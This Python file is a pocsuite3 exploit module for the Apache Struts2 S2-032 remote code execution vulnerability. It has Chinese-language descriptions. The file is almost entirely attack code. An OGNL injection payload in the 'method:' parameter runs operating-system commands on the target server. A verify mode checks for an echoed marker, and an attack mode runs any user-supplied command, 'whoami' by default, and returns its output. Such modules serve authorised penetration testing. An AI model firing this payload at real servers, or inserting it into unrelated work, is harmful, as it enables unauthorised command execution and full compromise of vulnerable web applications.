from collections import OrderedDict

from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.3.20-28'
    name = 'Struts2-032远程代码执行'
    desc = '''Struts2-032远程代码执行'''
    pocDesc = '''Struts2-032远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://github.com/vulhub/vulhub/blob/master/struts2/s2-032/README.zh-cn.md']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):

        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        payload = ("?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3D%40org.a"
            "pache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding"
            "(%23parameters.encoding%5B0%5D),%23w%3D%23res.getWriter(),%23s%3Dnew+java.util.Scanner"
            "(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter"
            "(%23parameters.pp%5B0%5D),%23str%3D%23s.hasNext()%3F%23s.next()%3A%23parameters.ppp%5B0%5D,%23w."
            "print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=RECOMMAND&pp=____A&ppp=%20&encoding=UTF-8")
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload
        flag = "VuLnEcHoPoCSuCCeSS"

        try:
            response = requests.get(url, headers=HEADERS)
            if response and response.status_code == 200 and flag in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = self.get_option("command")
        payload = ("?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3D%40org.a"
                   "pache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding"
                   "(%23parameters.encoding%5B0%5D),%23w%3D%23res.getWriter(),%23s%3Dnew+java.util.Scanner"
                   "(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter"
                   "(%23parameters.pp%5B0%5D),%23str%3D%23s.hasNext()%3F%23s.next()%3A%23parameters.ppp%5B0%5D,%23w."
                   "print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=RECOMMAND&pp=____A&ppp=%20&encoding=UTF-8")
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload

        try:
            response = requests.get(url, headers=HEADERS)
            if response and response.status_code == 200:
                result['Stdout'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)


register_poc(DemoPOC)
